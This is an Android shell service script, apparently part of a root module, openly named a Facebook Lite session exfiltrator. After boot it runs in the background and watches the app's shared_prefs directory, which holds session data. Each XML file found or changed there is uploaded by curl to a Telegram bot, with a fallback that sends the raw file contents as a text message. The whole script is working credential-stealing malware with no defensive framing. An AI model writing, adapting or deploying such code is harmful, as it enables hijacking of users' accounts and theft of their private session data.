#!/system/bin/sh

# FB Lite Session Exfiltrator - Service Script
# Runs in background after boot, monitors XML files

MODDIR=${0%/*}

# Source config
. ${MODDIR}/config.sh

# Log file
LOG_FILE="/data/local/tmp/fblite_exfil.log"

log() {
  echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" >> $LOG_FILE
}

send_to_telegram() {
  local file="$1"
  local filename=$(basename "$file")
  
  # Read file content for fallback if upload fails
  local content=$(cat "$file" 2>/dev/null)
  
  # Try sending as document
  response=$(curl -s -X POST "$API_URL" \
    -F "chat_id=$CHAT_ID" \
    -F "document=@$file" \
    -F "caption=📁 FB Lite: $filename" \
    -F "parse_mode=HTML" 2>/dev/null)
  
  if echo "$response" | grep -q '"ok":true'; then
    log "SUCCESS: Sent $filename to Telegram"
  else
    log "FAILED: Document upload failed, sending raw content"
    # Fallback: send as text if file is small enough
    if [ ${#content} -lt 4000 ]; then
      curl -s -X POST "https://api.telegram.org/bot${BOT_TOKEN}/sendMessage" \
        -d "chat_id=$CHAT_ID" \
        -d "text=📄 <b>$filename</b>%0A%0A<code>$(echo "$content" | sed 's/&/\&amp;/g; s/</\&lt;/g; s/>/\&gt;/g')</code>" \
        -d "parse_mode=HTML" > /dev/null 2>&1
    fi
  fi
}

watch_xml_files() {
  local watch_dir="/data/data/${PACKAGE}/shared_prefs"
  
  # Wait for directory to exist
  while [ ! -d "$watch_dir" ]; do
    sleep 5
  done
  
  log "Starting monitor on $watch_dir"
  
  # Initialize: find and send existing XML files
  find "$watch_dir" -name "*.xml" -type f | while read file; do
    send_to_telegram "$file"
    # Mark file as sent by touching a sentinel
    touch "${file}.sent" 2>/dev/null
  done
  
  # Use inotify for real-time monitoring (if available)
  if command -v inotifyd >/dev/null 2>&1; then
    log "Using inotifyd for real-time monitoring"
    inotifyd - "$watch_dir" | while read event path; do
      case "$event" in
        c|w|m|d)
          if echo "$path" | grep -q "\.xml$"; then
            # Small delay to ensure file is fully written
            sleep 1
            send_to_telegram "$path"
          fi
          ;;
      esac
    done
  else
    # Fallback: periodic polling
    log "inotifyd not available, using polling mode (${WATCHDOG_INTERVAL}s)"
    while true; do
      find "$watch_dir" -name "*.xml" -type f -newer "${watch_dir}/.timestamp" 2>/dev/null | while read file; do
        send_to_telegram "$file"
      done
      touch "${watch_dir}/.timestamp" 2>/dev/null
      sleep $WATCHDOG_INTERVAL
    done
  fi
}

log "FB Lite Session Exfiltrator starting"
watch_xml_files &
